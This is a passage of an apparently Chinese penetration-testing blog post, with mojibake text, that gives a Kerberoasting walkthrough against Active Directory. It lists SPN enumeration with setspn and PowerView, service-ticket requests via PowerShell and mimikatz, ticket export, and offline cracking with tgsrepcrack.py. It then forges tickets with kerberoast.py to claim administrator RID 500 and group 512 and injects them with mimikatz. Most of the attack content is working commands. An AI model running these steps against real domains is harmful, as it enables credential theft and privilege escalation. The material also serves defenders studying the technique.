<pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;computer1.pentest.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>MSSQLSvcï¼šMSSQLæœåŠ¡</li>
<li>computer1.pentest.comï¼šä¸»æœºåæ˜¯computer1 åŸŸåæ˜¯pentest.com</li>
<li>1433ï¼šç«¯å£æ˜¯1433</li>
</ul>
<p>Exchange æœåŠ¡çš„å®ä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;EXCAS01.pentest.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>RDPæœåŠ¡çš„å®ä¾‹ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">TERMSERV&#x2F;EXCAS01.pentest.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>WSMan&#x2F;WinRM&#x2F;PSRemotingæœåŠ¡çš„å®ä¾‹ä»£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;EXCAS01.pentest.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="SPNæ‰«æ"><a href="#SPNæ‰«æ" class="headerlink" title="SPNæ‰«æ"></a>SPNæ‰«æ</h2><p>SPNæ‰«æä¹Ÿç§°åšâ€æ‰«æKerberosæœåŠ¡å®ä¾‹åç§°â€ã€‚é€šè¿‡è¯·æ±‚ç‰¹å®šSPNç±»å‹çš„æœåŠ¡ä¸»é¢˜åç§°æ¥æŸ¥æ‰¾æœåŠ¡ã€‚</p>
<p><strong>SetSPN</strong></p>
<p>Win7å’ŒWindows Server2008è‡ªå¸¦çš„å·¥å…·</p>
<p>æŸ¥çœ‹å½“å‰åŸŸå†…çš„æ‰€æœ‰SPNï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">setspn.exe -q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŸ¥çœ‹teståŸŸå†…çš„æ‰€æœ‰SPNï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">setspn.exe -T test -q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æŸ¥æ‰¾å…³é”®å­—ç¬¦ä¸²ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">setspn.exe -q *&#x2F;* | findstr &quot;xxx&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p><strong>Powershell-AD-Recon</strong>å·¥å…·åŒ…æä¾›äº†ä¸€ç³»åˆ—çš„æœåŠ¡ä¸æœåŠ¡ç™»å½•è´¦å·å’Œè¿è¡ŒæœåŠ¡ä¹‹é—´çš„å¯¹åº”å…³ç³»</p>
<p>ä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼š<a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
<p>åˆ©ç”¨powerview è¿›è¡Œæ‰«æ</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell
Discover-PSInterestingServices<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h2 id="è¯·æ±‚"><a href="#è¯·æ±‚" class="headerlink" title="è¯·æ±‚"></a>è¯·æ±‚</h2><p>powershellè¯·æ±‚</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel
<span class="token function">New-Object</span> System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"SPNæœåŠ¡åç§°"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>mimikatzè¯·æ±‚</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::ask &#x2F;target:xxxx&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¯·æ±‚ä¹‹åä½¿ç”¨<code>klist</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹æˆ‘ä»¬è¯·æ±‚çš„ç¥¨æ®ã€‚</p>
<h2 id="å¯¼å‡º"><a href="#å¯¼å‡º" class="headerlink" title="å¯¼å‡º"></a>å¯¼å‡º</h2><p>æŠŠç¥¨æ®å¯¼å‡ºæˆæ–‡ä»¶ .kirbiã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::list &#x2F;export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="ç ´è§£"><a href="#ç ´è§£" class="headerlink" title="ç ´è§£"></a>ç ´è§£</h2><p>æŠŠå¯¼å‡ºçš„å¯¹åº”çš„ç¥¨æ®ä¿å­˜åˆ°æœ¬åœ°ã€‚</p>
<p>ç”¨åˆ°çš„å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">GitHub - nidem&#x2F;kerberoast</a></p>
<p>tgsrepcrack</p>
<pre class="line-numbers language-none"><code class="language-none">python tgsrepcrack.py passwd.txt xxxxx.xxxx.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç ´è§£æˆåŠŸä¼šå¾—åˆ°å¯†ç ã€‚</p>
<h2 id="é‡å†™"><a href="#é‡å†™" class="headerlink" title="é‡å†™"></a>é‡å†™</h2><p>æŠŠç ´è§£å‡ºæ¥çš„å¯†ç é‡å†™è¿›æ–°çš„ç¥¨æ®é‡Œï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">python kerberoast.py -p password123 -r xxxxx.kirbi -w NEW.kirbi -u 500
python kerberoast.py -p password123 -r xxxxx.kirbi -w NEW.kirbi -g 512<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>password123æ˜¯ç ´è§£å‡ºæ¥çš„å¯†ç </li>
<li>xxxxx.kirbiæ˜¯åŸæ¥çš„ç¥¨æ®</li>
<li>NEW.kirbiæ˜¯ç”Ÿæˆçš„æ–°ç¥¨æ®çš„åç§°</li>
<li>-u 500æ˜¯ç”¨æˆ·æ˜¯ç®¡ç†å‘˜</li>
<li>-g 512æ˜¯ç”¨æˆ·ç»„æ˜¯ç®¡ç†å‘˜ç»„</li>
</ul>
<p>æœ€ååˆ©ç”¨mimikatzæŠŠé‡å†™çš„ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::ppt xxxxx.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>

  <p><a class="classtest-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">å†…ç½‘</a> â€” 2022å¹´8æœˆ26æ—¥</p>
  


        </div>
        <div class="row mt-2">
  <h3>Search</h3>
  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
  <div style="margin-top: 1.5rem;">
    <ul id="result"></ul>
  </div>
</div>
        <div class="row mt-2">
  
    <div class="eight columns">
      <p id="madewith">Made with â¤ and
        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
        </a>
        
    </div>

    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
    <div class="four columns mb-3 posisi" >
      
      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      

      

      
      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
      </a>
      

      
      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
      </a>
      

      

    </div>
  
</div>
<script src="/js/prism/prism.js" async></script>
      </div>

    </div>

  </div>
  <script src="/js/nanobar.min.js"></script>

  <script>
    var options = {
      classname: 'nanobar',
      id: 'myNanobar'
    };
    var nanobar = new Nanobar(options);
    nanobar.go(30);
    nanobar.go(76);
    nanobar.go(100);
  </script>

</body>

</html>